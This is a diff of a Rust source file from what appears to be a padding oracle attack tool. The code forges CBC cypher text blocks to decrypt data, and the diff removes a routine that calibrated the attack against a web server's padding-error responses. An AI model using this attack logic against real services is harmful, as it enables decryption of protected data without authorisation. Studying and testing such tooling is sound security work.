@@ -1,7 +1,4 @@
-pub mod calibration_response;
-
 use std::{
-    collections::HashMap,
     mem,
     time::{Duration, Instant},
 };
@@ -10,20 +7,17 @@ use anyhow::{anyhow, Context, Result};
 use humantime::format_duration;
 use log::{debug, error, info, warn};
 use rayon::iter::{IntoParallelIterator, IntoParallelRefMutIterator, ParallelIterator};
-use reqwest::blocking::Response;
 use retry::{delay::Fibonacci, retry_with_index, OperationResult};
 
 use crate::{
     block::block_size::BlockSizeTrait,
     cypher_text::{encode::AmountBlocksTrait, forged_cypher_text::ForgedCypherText, CypherText},
     logging::LOG_TARGET,
-    oracle::{web::calibrate_web::CalibrationWebOracle, Oracle},
-    questioning::calibration_response::CalibrationResponse,
+    mediator::Mediator,
+    oracle::Oracle,
+    other::{RETRY_DELAY_MS, RETRY_MAX_ATTEMPTS},
     tui::ui_update::UiEvent,
 };
-
-const RETRY_DELAY_MS: u64 = 100;
-const RETRY_MAX_ATTEMPTS: u64 = 3;
 
 /// Manages the oracle attack on a high level.
 pub(super) struct Questioning<'a, U>
@@ -39,18 +33,19 @@ where
     U: FnMut(UiEvent) + Sync + Send + Clone,
 {
     /// Divides the cypher text into a modifiable part for each block.
-    pub(super) fn prepare(
-        update_ui_callback: U,
-        cypher_text: &'a CypherText,
-        no_iv: bool,
-    ) -> Result<Self> {
-        let blocks_to_skip = if no_iv { 0 } else { 1 };
+    pub(super) fn prepare(update_ui_callback: U, cypher_text: &'a CypherText) -> Result<Self> {
+        // IV is not decrypted
+        let blocks_to_skip = 1;
 
-        debug!(
-            target: LOG_TARGET,
-            "Preparing {} forged cypher texts to decrypt blocks",
-            cypher_text.amount_blocks() - blocks_to_skip
-        );
+        if cypher_text.amount_blocks() - blocks_to_skip == 0 {
+            return Err(anyhow!("Decryption impossible with only 1 block"));
+        } else {
+            debug!(
+                target: LOG_TARGET,
+                "Preparing {} forged cypher texts to decrypt blocks",
+                cypher_text.amount_blocks() - blocks_to_skip
+            );
+        }
         let mut forged_cypher_texts =
             Vec::with_capacity(cypher_text.amount_blocks() - blocks_to_skip);
         // decryption is based on recognizing padding. Padding is only at the end of a message. So to decrypt the n-th block, all blocks after it have to be dropped and the "n - 1"-th block must be forged.
@@ -202,79 +197,8 @@ where
         Ok(())
     }
 
-    /// Find how the web oracle responds in case of a padding error
-    pub(super) fn calibrate_web_oracle(
-        &mut self,
-        oracle: CalibrationWebOracle,
-    ) -> Result<CalibrationResponse> {
-        let calibration_cypher_text = &self.forged_cypher_texts[0];
-
-        let responses = (u8::MIN..=u8::MAX)
-            .into_par_iter()
-            .map(|byte_value| {
-                // `clone` so we don't modify any forged cypher texts before the actual attack
-                let mut forged_cypher_text = calibration_cypher_text.clone();
-
-                forged_cypher_text.set_current_byte(byte_value)?;
-                debug!(
-                    target: LOG_TARGET,
-                    "Calibration block: trying layout {:?}",
-                    forged_cypher_text.forged_block_wip()
-                );
-
-                let response =
-                    retry_with_index(Fibonacci::from_millis(RETRY_DELAY_MS), |attempt| {
-                        calibrate_while_handling_retries(
-                            attempt,
-                            byte_value,
-                            &oracle,
-                            &forged_cypher_text,
-                        )
-                    })
-                    .map_err(|e| anyhow!(e.to_string()))?;
-
-                CalibrationResponse::from_response(response, *oracle.config().consider_body())
-            })
-            .collect::<Result<Vec<_>>>()
-            .context("Failed to request web server for calibration")?;
-
-        // false positive, the hashmap's key (`response`) is obviously not mutable
-        #[allow(clippy::mutable_key_type)]
-        let counted_responses = responses.into_iter().fold(
-            HashMap::new(),
-            |mut acc: HashMap<CalibrationResponse, usize>, response| {
-                *acc.entry(response).or_default() += 1;
-                acc
-            },
-        );
-
-        let padding_error_response = counted_responses
-            .into_iter()
-            .max_by_key(|(_, seen)| *seen)
-            .map(|(response, _)| response)
-            .expect("The hashmap can only be empty if no responses were received, which can only happen if errors occurred. But errors were already resolved by unpacking the potential responses.");
-
-        info!(
-            target: LOG_TARGET,
-            "Calibrated the web oracle! Using parameters:"
-        );
-        info!(
-            target: LOG_TARGET,
-            "- Status: {}",
-            padding_error_response.status()
-        );
-        if let Some(location) = padding_error_response.location() {
-            info!(target: LOG_TARGET, "- Location: {}", location.to_str()?);
-        }
-        if *oracle.config().consider_body() {
-            info!(
-                target: LOG_TARGET,
-                "- Content length: {:?}",
-                padding_error_response.content_length()
-            );
-        }
-
-        Ok(padding_error_response)
+    pub(super) fn request_mediator(&self) -> Mediator {
+        Mediator::new(self.forged_cypher_texts[0].clone())
     }
 }
 
@@ -315,38 +239,6 @@ fn validate_while_handling_retries(
                 byte_value,
                 attempt,
                 RETRY_MAX_ATTEMPTS
-            ))
-        }
-    }
-}
-
-fn calibrate_while_handling_retries(
-    attempt: u64,
-    byte_value: u8,
-    oracle: &CalibrationWebOracle,
-    forged_cypher_text: &ForgedCypherText,
-) -> OperationResult<Response, String> {
-    if attempt > RETRY_MAX_ATTEMPTS {
-        return OperationResult::Err(format!(
-            "Calibration block, value {}: validation failed",
-            byte_value
-        ));
-    }
-
-    match oracle.ask_validation(forged_cypher_text) {
-        Ok(correct_padding) => OperationResult::Ok(correct_padding),
-        Err(e) => {
-            warn!(
-                target: LOG_TARGET,
-                "Calibration block, value {}: retrying validation ({}/{})",
-                byte_value,
-                attempt,
-                RETRY_MAX_ATTEMPTS
-            );
-            debug!(target: LOG_TARGET, "{:?}", e);
-            OperationResult::Retry(format!(
-                "Calibration block, value {}: retrying validation ({}/{})",
-                byte_value, attempt, RETRY_MAX_ATTEMPTS
             ))
         }
     }
